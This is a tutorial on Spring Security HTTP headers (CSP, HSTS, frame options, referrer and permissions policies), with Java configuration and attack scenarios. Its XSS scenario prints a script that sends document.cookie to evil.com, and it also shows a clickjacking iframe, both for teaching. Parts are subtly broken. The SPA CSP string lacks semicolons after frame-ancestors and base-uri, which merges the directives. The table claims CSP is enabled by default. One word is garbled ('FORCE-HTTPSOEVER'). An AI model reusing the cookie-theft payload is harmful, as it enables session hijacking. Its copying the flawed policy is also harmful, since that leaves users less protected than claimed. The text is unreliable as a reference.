---
title: Security Headers — HTTP Headers That Protect Your Users
summary: Content-Security-Policy, HSTS, X-Frame-Options, X-Content-Type-Options, and more — the HTTP headers that prevent XSS, clickjacking, and MIME sniffing attacks. Beginner-friendly with line-by-line code.
order: 15
minutes: 20
topics: [security headers, CSP, HSTS, X-Frame-Options, X-Content-Type-Options, CORS, Referrer-Policy, Permissions-Policy]
docs:
  - https://docs.spring.io/spring-security/reference/servlet/exploits/headers.html
  - https://owasp.org/www-project-secure-headers/
---

# Security Headers — HTTP Headers That Protect Your Users

## What are Security Headers? (From Zero)

When your server sends a response, it includes **HTTP headers** — metadata about the response. Some headers tell the browser how to handle the content securely. These are your **security headers** — they tell the browser "don't run scripts from random domains" or "only access this site over HTTPS."

Without security headers, your site is vulnerable to attacks like XSS (Cross-Site Scripting), clickjacking, and MIME sniffing. Spring Security adds most of them automatically, but you should understand what each one does.

### The Essential Security Headers

| Header | What it prevents | Default in Spring Security |
|---|---|---|
| `Content-Security-Policy` | XSS (script injection) | ✅ Yes |
| `Strict-Transport-Security` (HSTS) | Protocol downgrade attacks | ✅ Yes |
| `X-Content-Type-Options` | MIME sniffing attacks | ✅ Yes |
| `X-Frame-Options` | Clickjacking (iframe overlay) | ✅ Yes |
| `X-XSS-Protection` | Reflected XSS (legacy) | ✅ Yes |
| `Referrer-Policy` | Referrer leakage | ✅ Yes |
| `Permissions-Policy` | Feature abuse (camera, mic, geolocation) | ⚠️ Configurable |

---

## The Code — Line by Line

### Spring Security Default Headers


**What this code does — step by step:**

1. Content Security Policy — controls what resources the browser can load
2. `"default-src 'self'; " +` — Only load from own domain
3. `"script-src 'self' https://cdn.example.com; " +` — Scripts from CDN allowed
4. `"style-src 'self' 'unsafe-inline'; " +` — Inline styles allowed
5. `"img-src 'self' data: https:; " +` — Images from HTTPS sources
6. `"font-src 'self' https://fonts.gstatic.com; "` — Google Fonts
7. HSTS — force HTTPS for all future requests
8. `.includeSubDomains(true)` — Apply to all subdomains
9. `.maxAgeInSeconds(31536000)` — 1 year — browser remembers
10. `.preload(true)` — Can be submitted to browser preload lists
11. Prevent MIME sniffing — browser must respect Content-Type header
12. Prevent clickjacking — don't allow this site in iframes
13. `.sameOrigin()` — Only same-origin iframes allowed. .deny() // No iframes at all (strictest). .allowFrom("https://trusted.com") // Deprecated — use CSP instead
14. XSS Protection (legacy browsers)
15. Block mode: browser renders nothing instead of sanitizing
16. Control referrer information
17. Send full URL for same-origin, only origin for cross-origin
18. Control browser features
19. Disable: geolocation, camera, microphone, payment APIs

The same code, clean:

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self' https://cdn.example.com; " +
                        "style-src 'self' 'unsafe-inline'; " +
                        "img-src 'self' data: https:; " +
                        "font-src 'self' https://fonts.gstatic.com; "
                    )
                )

                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                    .preload(true)
                )

                .contentTypeOptions(Customizer.withDefaults())

                .frameOptions(frame -> frame
                    .sameOrigin()
                )

                .xssProtection(xss -> xss
                    .headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK)
                )

                .referrerPolicy(referrer -> referrer
                    .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
                )

                .permissionsPolicy(permissions -> permissions
                    .policy("geolocation=(), camera=(), microphone=(), payment=()")
                )
            );

        return http.build();
    }
}
```

**Line-by-line explained:**
- `contentSecurityPolicy` — The most important header. Tells the browser which URLs are allowed for scripts, styles, images, etc. Prevents XSS by blocking inline scripts from untrusted sources.
- `httpStrictTransportSecurity` — After the first HTTPS visit, the browser FORCE-HTTPSOEVER for the next year. Prevents SSL stripping attacks.
- `contentTypeOptions` — Forces the browser to respect the declared Content-Type. Prevents MIME sniffing (browser treating a text file as a script).
- `frameOptions(sameOrigin)` — Prevents other sites from embedding your site in an iframe (clickjacking). `sameOrigin` allows your own iframes.
- `xssProtection` — For legacy browsers that support it. `ENABLED_MODE_BLOCK` means "block the page entirely" instead of trying to sanitize.
- `referrerPolicy` — Controls how much URL info is sent to other sites when clicking links. `STRICT_ORIGIN_WHEN_CROSS_ORIGIN` is a good balance.
- `permissionsPolicy` — Disables browser features your app doesn't use. Prevents malicious scripts from accessing camera, microphone, etc.

### Custom CSP for a SPA (Single Page Application)


**What this code does — step by step:**

1. For React/Angular/Vue SPAs that load from a CDN:
2. `"script-src 'self' https://cdn.jsdelivr.net; " +` — JS from jsDelivr CDN
3. `"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +` — Google Fonts CSS
4. `"font-src 'self' https://fonts.gstatic.com; " +` — Google Fonts files
5. `"img-src 'self' data: https:; " +` — Images from HTTPS
6. `"connect-src 'self' https://api.myapp.com; " +` — API calls to your backend
7. `"frame-ancestors 'none' " +` — No iframes (stricter than X-Frame-Options)
8. `"base-uri 'self' " +` — Prevent base tag injection
9. `"form-action 'self'"` — Forms can only submit to self

The same code, clean:

```java
.contentSecurityPolicy(csp -> csp
    .policyDirectives(
        "default-src 'self'; " +
        "script-src 'self' https://cdn.jsdelivr.net; " +
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; " +
        "font-src 'self' https://fonts.gstatic.com; " +
        "img-src 'self' data: https:; " +
        "connect-src 'self' https://api.myapp.com; " +
        "frame-ancestors 'none' " +
        "base-uri 'self' " +
        "form-action 'self'"
    )
)
```

---

## Real-World Scenarios

### Scenario 1: Preventing XSS in a Blog

Without CSP:
```html
<!-- Attacker injects this into a blog comment: -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)  // Steals user's session!
</script>
```

With CSP `script-src 'self'`:
```
Content-Security-Policy: script-src 'self'
→ Browser BLOCKS the inline script — attack fails
→ Only scripts from your own domain are allowed to run
```

### Scenario 2: HSTS Preventing SSL Strip

```bash
# Without HSTS:
# 1. User types http://bank.com
# 2. Attacker intercepts (man-in-the-middle)
# 3. Redirects to http:// (not HTTPS) — user doesn't notice
# 4. Attacker captures credentials

# With HSTS (Strict-Transport-Security: max-age=31536000):
# 1. User types http://bank.com
# 2. Browser has HSTS header cached → FORCE HTTPS → https://bank.com
# 3. Attacker can't downgrade to HTTP
```

### Scenario 3: Clickjacking Prevention

```html
<!-- Attacker's site: -->
<iframe src="https://your-bank.com/transfer" style="opacity: 0.01;">
</iframe>
<!-- User thinks they're clicking a button on the attacker's site -->
<!-- But they're actually clicking "Transfer $1000" on your bank! -->

<!-- With X-Frame-Options: DENY or SAMEORIGIN: -->
<!-- Browser REFUSES to load your site in the attacker's iframe -->
<!-- Clickjacking attack fails -->
```

---

## Common Mistakes

| Mistake | Why It Breaks | Fix |
|---|---|---|
| CSP too strict (no `'unsafe-inline'`) | Inline styles/scripts in your own app break | Add specific domains, use nonces for inline scripts |
| HSTS with short max-age | Browser forgets quickly, user exposed again | Use 1 year (31536000) minimum |
| Ignoring CSP entirely | XSS attacks execute freely | Add at least `default-src 'self'` |
| Allowing `X-Frame-Options: ALLOWALL` | Clickjacking possible | Use `DENY` or `SAMEORIGIN` |
| Not testing CSP in development | CSP breaks production silently | Enable CSP in dev, check browser console |

---

## Key Takeaways

- **CSP is the most important** security header — it prevents XSS by controlling what scripts can run.
- **HSTS** forces HTTPS — use `max-age=31536000` and `includeSubDomains`.
- **Spring Security adds most headers by default** — understand what they do so you can customize them.
- **Test CSP in development** — restrictive policies can break legitimate functionality.
- **Defense in depth**: headers + input validation + output encoding = layered XSS protection.

Official docs: [Security Headers (Spring)](https://docs.spring.io/spring-security/reference/servlet/exploits/headers.html) · [OWASP Secure Headers](https://owasp.org/www-project-secure-headers/)

## References

- [W3Schools — Java Tutorial](https://www.w3schools.com/java/)
- [docs.spring.io/spring-security/reference](https://docs.spring.io/spring-security/reference/)
